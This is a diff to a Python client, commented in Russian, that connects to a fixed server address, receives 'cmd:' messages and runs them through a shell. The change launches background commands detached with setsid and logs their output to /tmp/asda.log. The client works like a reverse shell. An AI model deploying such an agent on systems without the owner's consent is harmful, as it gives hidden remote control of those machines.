@@ -4,7 +4,7 @@ import os
 import sys
 import time
 
-SERVER_IP = "192.168.100.3"  # Установите ваш IP сервера
+SERVER_IP = "192.168.100.3"  # Установите IP сервера
 SERVER_PORT = 5000
 BUFFER_SIZE = 4096
 
@@ -52,20 +52,37 @@ def main():
                 if command.startswith("cmd:"):
                     cmd = command[4:].strip()
 
-                    # Обработка команд с nohup или фоновым запуском (&) через shell=True
+                    # Обработка команд с nohup/фоновым запуском - заменяем на setsid с логами
                     if "nohup" in cmd or cmd.endswith('&'):
                         try:
+                            # Пример запуска через setsid, лог в /tmp/asda.log
+                            # Здесь подставляем нужный путь к python3 и скрипту
+                            log_file = "/tmp/asda.log"
+
+                            # Разбиваем команду на части, выделяем путь до скрипта, если нужно
+                            # Для простоты — если в команде 'python3 "путь"', просто подставим setsid для нейтрализации nohup и &
+                            # Для универсальности можно обрабатывать отдельно, но пока так
+
+                            # Пример: если cmd содержит python3 и путь к файлу, выделим его
+                            # И сформируем новую команду
+                            import re
+                            m = re.search(r'python3\s+"([^"]+)"', cmd)
+                            if m:
+                                script_path = m.group(1)
+                                python_path = "/usr/bin/python3"  # или путь из which python3
+                                run_cmd = f'setsid {python_path} "{script_path}" > {log_file} 2>&1 < /dev/null &'
+                            else:
+                                # Если не нашли — запуск как есть с setsid
+                                run_cmd = f'setsid {cmd} > {log_file} 2>&1 < /dev/null &'
+
                             subprocess.Popen(
-                                cmd,
+                                run_cmd,
                                 shell=True,
-                                cwd=os.getcwd(),
-                                stdout=subprocess.DEVNULL,
-                                stderr=subprocess.DEVNULL,
-                                preexec_fn=os.setpgrp  # отделяет процесс от терминала
+                                cwd=os.getcwd()
                             )
-                            s.send("Команда запущена через nohup/в фоне (shell=True).".encode())
+                            s.send("Команда запущена через setsid с логированием.".encode())
                         except Exception as e:
-                            s.send(f"Ошибка запуска команды с nohup/в фоне: {e}".encode())
+                            s.send(f"Ошибка запуска команды с setsid: {e}".encode())
                         continue
 
                     if cmd.startswith("cd"):
